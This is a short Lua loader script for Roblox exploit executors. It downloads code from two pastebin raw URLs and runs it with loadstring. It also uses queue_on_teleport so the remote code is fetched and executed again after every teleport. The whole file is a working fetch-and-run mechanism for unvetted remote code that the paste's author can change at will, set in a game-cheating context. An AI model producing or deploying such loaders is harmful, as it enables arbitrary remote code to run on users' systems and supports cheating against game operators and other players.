local g = getgenv()
if g._AutoLoader then return end
g._AutoLoader = true

local MAIN = "https://pastebin.com/raw/rWheMh7E"
local AUTO = "https://pastebin.com/raw/t2gp6dnU"

local function safeLoad(url)
    local ok, src = pcall(game.HttpGet, game, url)
    if ok then pcall(loadstring(src)) end
end

local function onTeleport()
    local q = (syn and syn.queue_on_teleport) or queue_on_teleport or queueonteleport
    if type(q) == "function" then
        q(('pcall(function() loadstring(game:HttpGet("%s"))() end)'):format(AUTO))
    end
end

task.spawn(onTeleport)
safeLoad(MAIN)
